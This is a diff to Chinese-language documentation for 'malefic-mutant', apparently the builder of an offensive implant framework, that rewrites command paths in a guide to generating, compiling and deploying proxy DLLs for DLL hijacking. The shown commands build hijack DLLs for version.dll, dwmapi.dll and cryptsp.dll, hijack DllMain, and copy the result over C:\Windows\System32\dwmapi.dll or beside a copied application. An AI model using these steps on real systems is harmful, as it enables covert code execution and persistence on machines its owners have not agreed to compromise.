@@ -56,11 +56,11 @@ DLL 导出定义文件：
 
 ### 步骤 1：生成 ProxyDLL
 
-使用 `malefic-mutant` 生成代理 DLL 代码：
+进入 release 离线包的 `source_code/` 后，使用包内配套的 `malefic-mutant` 生成代理 DLL 代码：
 
 ```bash
 # 基本生成
-malefic-mutant generate loader proxydll \
+./bin/malefic-mutant generate loader proxydll \
   -r version.dll \
   -p version_orig.dll \
   -e GetFileVersionInfoW
@@ -76,13 +76,13 @@ malefic-mutant generate loader proxydll \
 
 ```bash
 # 劫持 DllMain
-malefic-mutant generate loader proxydll \
+./bin/malefic-mutant generate loader proxydll \
   -r version.dll \
   -p version_orig.dll \
   --hijack-dll-main
 
 # 从 implant.yaml 读取配置
-malefic-mutant generate loader proxydll
+./bin/malefic-mutant generate loader proxydll
 ```
 
 ### 步骤 2：实现 Payload
@@ -121,11 +121,7 @@ pub extern "C" fn execute_payload() {
 ### 步骤 3：编译 ProxyDLL
 
 ```bash
-# 标准编译
-cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu
-
-# 或使用 mutant
-malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
+./bin/malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
 ```
 
 编译产物位于 `target/<target_triple>/release/malefic_proxydll.dll`。
@@ -256,7 +252,7 @@ block: false
 # 使用 Process Monitor 或 Dependency Walker
 
 # 2. 生成代理 DLL
-malefic-mutant generate loader proxydll \
+./bin/malefic-mutant generate loader proxydll \
   -r dwmapi.dll \
   -p dwmapi_orig.dll \
   -e DwmIsCompositionEnabled
@@ -272,7 +268,7 @@ cp malefic_proxydll.dll C:\Windows\System32\dwmapi.dll
 
 ```bash
 # 劫持加密 API
-malefic-mutant generate loader proxydll \
+./bin/malefic-mutant generate loader proxydll \
   -r cryptsp.dll \
   -p cryptsp_orig.dll \
   -e CryptAcquireContextW
@@ -287,7 +283,7 @@ malefic-mutant generate loader proxydll \
 cp "C:\Program Files\App\app.exe" C:\Users\User\app.exe
 
 # 2. 生成并部署代理 DLL
-malefic-mutant generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW
+./bin/malefic-mutant generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW
 cp C:\Windows\System32\version.dll C:\Users\User\version_orig.dll
 cp malefic_proxydll.dll C:\Users\User\version.dll
 
@@ -493,13 +489,7 @@ build:
 ### 标准编译
 
 ```bash
-cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu
-```
-
-### 使用 Mutant
-
-```bash
-malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
+./bin/malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
 ```
 
 ### Docker 编译
@@ -507,17 +497,17 @@ malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
 ```bash
 docker run -v "$(pwd):/root/src" --rm -it \
   ghcr.io/chainreactors/malefic-builder:latest \
-  sh -c "malefic-mutant generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW && cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu"
+  sh -lc "cd /root/src && chmod +x ./bin/malefic-mutant && ./bin/malefic-mutant generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW && ./bin/malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu"
 ```
 
 ### 交叉编译
 
 ```bash
-# x86 (32-bit)
-cargo build --release -p malefic-proxydll --target i686-pc-windows-gnu
+# x86
+./bin/malefic-mutant build proxy-dll --target i686-pc-windows-gnu
 
-# x64 (64-bit)
-cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu
+# x64
+./bin/malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
 ```
 
 ## 相关工具
